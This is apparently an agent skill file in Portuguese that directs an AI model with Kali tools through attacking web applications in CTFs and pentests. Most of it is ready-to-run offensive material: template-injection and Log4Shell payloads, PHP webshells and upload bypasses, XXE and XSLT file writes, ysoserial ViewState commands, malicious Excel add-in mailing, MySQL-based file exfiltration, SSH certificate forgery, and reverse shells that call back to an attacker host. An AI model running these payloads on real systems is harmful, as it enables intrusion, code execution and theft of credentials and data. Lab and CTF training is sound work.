---
name: ctf-web
description: Use esta skill quando o usuário estiver atacando uma aplicação web em um CTF ou pentest e mencionar "web", "http", "aplicação web", "exploit web", "burp", "directory traversal", "CMS", "login bypass", "autenticação", "XSS", "SSRF", "SSTI", "LFI", "RFI", "upload de arquivo", "JWT", "deserialization", "gRPC", "WebSocket", "Spring Boot", "Joomla", "WordPress", "ViewState", "Ghostscript", "Log4Shell", ou quiser explorar um servidor web.
argument-hint: <url-alvo> [caminho-wordlist]
allowed-tools: [mcp__mcp-kali-server__nikto_scan, mcp__mcp-kali-server__gobuster_scan, mcp__mcp-kali-server__dirb_scan, mcp__mcp-kali-server__wpscan_analyze, mcp__mcp-kali-server__sqlmap_scan, mcp__mcp-kali-server__execute_command]
---

# CTF Web — Metodologia de Ataque a Aplicações Web

Esta skill implementa uma metodologia estruturada de ataque web baseada em padrões da indústria para CTFs e laboratórios de segurança.

## Informações necessárias

Se $ARGUMENTS contiver URL, usar como TARGET_URL. Caso contrário, perguntar:
- "Qual é a URL do alvo? (ex: http://10.10.11.x ou http://app.local)"
- "Já tem credenciais válidas?"

## Passo 1 — Fingerprinting

Use `execute_command` com:
```bash
curl -sv <TARGET_URL> 2>&1 | head -80
```

Identificar:
- **Server**: Apache, Nginx, IIS, Caddy, Tomcat
- **X-Powered-By**: PHP, ASP.NET, Express, Java
- **Set-Cookie**: frameworks (PHPSESSID, JSESSIONID, laravel_session, _token CSRF, JSESSIONID)
- **Via / X-Forwarded**: proxies e load balancers
- **ETag**: pode revelar inode (vazamento de informação)

Use `nikto_scan` para detectar vulnerabilidades conhecidas e arquivos expostos.

## Passo 2 — Enumeração de diretórios

Use `gobuster_scan`:
```
gobuster dir -u <TARGET_URL> -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,bak,zip,old,conf,xml,json -t 50
```

Wordlists específicas:
```bash
# Spring Boot endpoints
gobuster dir -u <TARGET_URL> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt
# API endpoints
gobuster dir -u <TARGET_URL>/api -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt
```

**Arquivos sempre checar**: `/robots.txt`, `/.git/`, `/.env`, `/backup`, `/admin`, `/.htaccess`, `/web.config`, `/WEB-INF/web.xml`, `/.DS_Store`

## Passo 3 — Detecção de CMS e tecnologia

Use `wpscan_analyze` se WordPress detectado.

```bash
# Joomla
curl -s "<TARGET_URL>/administrator/"
curl -s "<TARGET_URL>/api/index.php/v1/config/application?public=true"  # CVE-2023-23752

# Drupal
curl -s "<TARGET_URL>/CHANGELOG.txt"

# Spring Boot Actuator (CRÍTICO)
curl -s "<TARGET_URL>/actuator"
curl -s "<TARGET_URL>/actuator/sessions"   # vazamento de JSESSIONID → auth bypass!
curl -s "<TARGET_URL>/actuator/env"
curl -s "<TARGET_URL>/actuator/heapdump"   # dump de memória com credenciais

# GitLab/Gitea/Forgejo
curl -s "<TARGET_URL>/help"

# Jupyter Notebook
curl -s "<TARGET_URL>/api/kernels"
ls -la /opt/*/logs/  # buscar token de autenticação nos logs
```

## Passo 4 — Execute After Redirect (EAR)

**Técnica EAR**: Muitas aplicações fazem redirect 302 sem `exit` depois → a página ainda executa.

Use `execute_command` com curl (não seguir redirects):
```bash
curl -s -X POST "<TARGET_URL>/admin.php" --max-redirs 0 -D - | head -50
# Se retornar conteúdo + Location: header → EAR!
# Fazer POST com Burp interceptando o 302 para acessar a página
```

## Passo 5 — Vetores de injeção por categoria

### 5a — SQL Injection
Testar `'`, `"`, `1=1`, `1=2`, `' OR '1'='1` em todos os inputs.
Se suspeito → **usar `/ctf-sqli`** para exploração completa.

### 5b — Server-Side Template Injection (SSTI)
```
{{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}, *{7*7}
```
Se retornar `49` → SSTI confirmado!

| Engine | Detecção | RCE Payload |
|--------|----------|-------------|
| Jinja2 (Python) | `{{config}}` | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Twig (PHP) | `{{_self}}` | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| Freemarker (Java) | `${7*7}` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity (Java) | `#set($x=7*7)${x}` | `#set($rt=$class.forName("java.lang.Runtime"))...` |
| ERB (Ruby) | `<%= 7*7 %>` | `<%= system("id") %>` |
| Pebble (Java) | `{{7*7}}` | `{% for x in "".class.forName("java.lang.Runtime").getMethod("exec","".class).invoke(...)%}` |

### 5c — SSRF (Server-Side Request Forgery)
```
http://127.0.0.1/admin
http://127.0.0.1:8080/actuator/env
http://169.254.169.254/latest/meta-data/        # AWS metadata
http://metadata.google.internal/computeMetadata/v1/  # GCP
http://169.254.169.254/metadata?api-version=2021-02-01  # Azure
file:///etc/passwd
dict://127.0.0.1:6379/        # Redis
gopher://127.0.0.1:25/_EHLO   # SMTP

# GitLab SSRF bypass
http://[0:0:0:0:0:ffff:127.0.0.1]  # IPv6 mapeado para localhost
```

### 5d — LFI / Path Traversal
```bash
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://input   # com POST: <?php system($_GET['cmd']); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
?page=zip://upload.zip%23shell.php

# os.path.join bypass (Python)
# Se o código usa os.path.join(base_dir, user_input):
# Enviar caminho absoluto: /etc/passwd
# O os.path.join ignora base_dir se user_input começa com /

# Splunk path traversal (CVE-2024-36991)
/en-US/modules/messaging/C:../C:../C:../C:../windows/win.ini
```

### 5e — XXE (XML External Entity)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

<!-- XXE via SVG upload -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg><text y="15">&xxe;</text></svg>
```

### 5f — Command Injection
```
; id, | id, `id`, $(id), & whoami &, %0a id
# Bypass de espaço: ${IFS} ou $IFS
; ping${IFS}-c${IFS}3${IFS}<KALI_IP>
# Spring Boot Actuator: campo SSH username
user;{ping,-c,1,10.10.14.6};#
```

### 5g — XSLT Injection
```xml
<!-- Escrever arquivo via EXSLT -->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:exploit="http://exslt.org/common" version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/html/shell.php">
      &lt;?php system($_GET['cmd']); ?&gt;
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

## Passo 6 — Exploits específicos por tecnologia

### PHP
```bash
# PHP 8.1.0-dev backdoor (CVE-2021-21224)
curl -H "User-Agentt: zerodiumsystem('id');" http://<TARGET>/

# PHP unserialize()
# Criar objeto serializado com __destruct() malicioso:
# O:14:"DatabaseExport":2:{s:9:"user_file";s:8:"shell.php";s:4:"data";s:34:"<?php system($_REQUEST['cmd']); ?>";}

# PHP disabled functions bypass
# popen() frequentemente não é bloqueado:
echo fread(popen($_REQUEST['cmd'], "r"), 1000000);
# Usar p0wny-shell ou weevely para auto-detecção

# Upload filter bypass
# Extensões alternativas: .phar, .pht, .phtml, .inc, .shtml, .ctp
# Magic bytes + double extension: \x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?> → shell.php.png
ffuf -u "http://target/upload" -X POST -F "file=@shell.FUZZ" -w extensions.txt
```

### .NET / ASP.NET
```bash
# ViewState deserialization
# 1. Extrair machineKey do web.config via path traversal
# 2. Gerar payload com ysoserial.net:
ysoserial.exe -p ViewState -g WindowsIdentity \
  --decryptionalg="AES" --decryptionkey="<KEY>" \
  --validationalg="SHA1" --validationkey="<KEY>" \
  --path="/portfolio" -c "whoami"

# IIS backdoor payload
# Endpoint: /ews/MsExgHealthCheckd/
# POST com base64-encoded .NET assembly no campo sdafwe3rwe23
mcs -target:library -out:rev.dll rev.cs  # compilar assembly
# Classe deve ter Run() no construtor, não Main()

# Blazor/SignalR JWT extraction
# localStorage.getItem('jwt') no DevTools
# Baixar DLLs de _framework/, descompilar com DotPeek/dnSpy
```

### Java
```bash
# Log4Shell (CVE-2021-44228)
# Payload JNDI: ${jndi:ldap://<KALI_IP>:1389/a}
# Usar Minecraft-Console-Client ou curl se for web
# Modificar log4j-shell-poc: trocar /bin/sh por cmd.exe no Windows

# JNDI via campo qualquer que passe pelo Log4j logger
# User-Agent, nome de usuário, qualquer input logado

# Groovy script injection (XWiki, Jenkins)
# CVE-2025-24893: Solr endpoint RCE via Groovy
```

### Joomla
```bash
# CVE-2023-23752 — API mass assignment
curl "http://target/api/index.php/v1/config/application?public=true"
# Retorna: {"db":"joomla","dbuser":"joomla","dbpass":"secret",...}
```

### LibreOffice / Office files
```bash
# Floating Frame RCE (CVE-2023-2255)
# Criar ODT com macro auto-executável no "Open Document"
# Ou modificar registro para desabilitar proteção de macros

# Malicious .XLL Excel Add-in
# Criar com Visual Studio + Excel SDK 2013
# Função xlAutoOpen() executa na abertura
swaks --to target@domain.local --from attacker@domain.local \
  --attach invoice.xll --server <TARGET_IP>

# Ghostscript RCE (CVE-2023-36664)
# EPS file com comando injetado, enviar por email
```

### gRPC
```bash
# Enumerar serviços
grpcurl -plaintext <TARGET_IP>:<PORT> list
grpcurl -plaintext <TARGET_IP>:<PORT> describe <SERVICE>

# Chamar método
grpcurl -plaintext -d '{"username":"admin","password":"test"}' \
  <TARGET_IP>:<PORT> <SERVICE>/<METHOD>

# SQL injection em parâmetro gRPC
grpcurl -plaintext -d '{"id":"1 union select sqlite_version()"}' \
  <TARGET_IP>:<PORT> SimpleApp/getInfo
```

### WebSocket
```bash
# SQL injection via WebSocket
sqlmap -u "ws://<TARGET_IP>:<PORT>/" \
  --data '{"id":"1234"}' \
  --dbms=sqlite --batch --level=5 --risk=3

# Testar manualmente com websocat
websocat "ws://<TARGET>:<PORT>" <<< '{"id":"1 OR 1=1"}'
```

### JWT
```bash
# Decodificar
echo "<JWT>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Algorithm none attack
python3 -c "
import base64, json
h = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
p = base64.b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
print(f'{h}.{p}.')
"

# pac4j JWT bypass (CVE-2026-29000)
# Criar JWT com alg:none, embrulhar em JWE com RSA-OAEP-256 + A256GCM
# Extrair chave pública RSA de /api/auth/jwks

# Splunk secret decryption
# Senhas no formato $7$ = AES256-GCM
pip install splunksecrets
splunksecrets --splunk-secret <SECRET_FILE> decrypt '<$7$HASH>'
```

### Adminer (MySQL client web)
```bash
# SSRF + leitura de arquivos locais via MySQL remoto
# 1. Configurar MySQL no Kali para aceitar conexões externas:
mysql -u root -e "GRANT ALL ON *.* TO 'root'@'<TARGET_IP>' IDENTIFIED BY 'password'; FLUSH PRIVILEGES;"
mysql -u root -e "CREATE DATABASE exfil; USE exfil; CREATE TABLE data (line TEXT);"

# 2. No Adminer: conectar ao Kali como servidor MySQL
# 3. Executar:
# LOAD DATA LOCAL INFILE '/var/www/html/config.php' INTO TABLE exfil.data FIELDS TERMINATED BY '\n';
# SELECT * FROM exfil.data;
```

## Passo 7 — Bypass de autenticação

```bash
# Default credentials (sempre tentar primeiro)
admin:admin, admin:password, admin:123456, root:root
# Tiny File Manager: admin/admin@123, user/12345
# Grafana: admin/admin

# IDOR em tokens/IDs
# QR codes codificados em base64 — modificar ID base64 para acessar outras contas
echo -n "2" | base64  # ID de admin costuma ser 2

# PowerShell CliXml encrypted credentials
$cred = Import-CliXml -Path connection.xml
$cred.GetNetworkCredential().Password  # descriptografa automaticamente no contexto do usuário

# LDAP injection em login
*)(|(objectClass=*)  # retorna todos os usuários
*)(uid=*))(|(uid=*   # bypass de filtro
```

## Passo 8 — Upload de arquivos

```bash
# Webshell PHP básico
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# Bypass de extensão
# .phar, .pht, .phtml, .inc, .php5, .php7, .php.jpg

# Magic bytes + double extension
echo -e '\x89\x50\x4e\x47\x0d\x0a\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php.png

# Fuzzing de extensões com ffuf
ffuf -u "http://target/upload.php" -X POST \
  -F "file=@shell.FUZZ;type=image/png" \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt \
  -fs 0
```

## Passo 9 — Reverse shells

```bash
# Iniciar listener
nc -lvnp 4444 &

# Bash
bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<KALI_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/rev.ps1')"

# OpenSSL (bypass de firewall/AV)
# Kali: gerar cert + dois listeners
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=x'
openssl s_server -quiet -key key.pem -cert cert.pem -port 73 &
openssl s_server -quiet -key key.pem -cert cert.pem -port 136 &
# Target (Windows cmd):
start cmd /c "openssl.exe s_client -quiet -connect <KALI>:73 | cmd.exe | openssl.exe s_client -quiet -connect <KALI>:136"
```

## Passo 10 — SSH Certificate Authority Exploitation

```bash
# Se encontrar CA key em /opt/*/ssh/ca ou similar:
# Forjar certificado para qualquer usuário
ssh-keygen -f /tmp/id_rsa -N ''
ssh-keygen -s /path/to/ca_key -I "root" -n "root" -V "+52w" /tmp/id_rsa.pub
# -n define o "principal" — se TrustedUserCAKeys sem AuthorizedPrincipalsFile → qualquer principal funciona
ssh -i /tmp/id_rsa -o CertificateFile=/tmp/id_rsa-cert.pub root@<TARGET>
```

## Checklist de Pentest Web

```
[ ] curl -I e -sv para headers completos
[ ] /robots.txt, /.git/, /.env, /backup, /admin
[ ] Virtual hosts: gobuster vhost -u http://target -w subdomains.txt
[ ] Source HTML: comentários e endpoints ocultos
[ ] Cookies: base64 decode, objetos serializados, JWT
[ ] Execute After Redirect: curl --max-redirs 0
[ ] Spring Boot: /actuator/sessions (auth bypass!)
[ ] Joomla: ?public=true API endpoint (CVE-2023-23752)
[ ] Upload: testar .phar, .pht, magic bytes bypass
[ ] gRPC presente? grpcurl list
[ ] WebSocket? sqlmap ws://
[ ] Ghostscript/LibreOffice? CVE de macros
[ ] Log4j input? ${jndi:ldap://kali/a}
```
